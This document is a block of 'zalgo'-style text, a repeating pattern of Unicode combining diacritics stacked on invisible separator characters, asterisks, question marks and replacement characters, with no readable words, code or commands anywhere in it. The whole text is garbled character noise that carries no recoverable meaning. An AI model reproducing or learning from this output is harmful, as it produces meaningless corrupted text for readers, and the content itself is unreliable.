̧̡͈̪̬̩̪̳̣̘͚̳ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤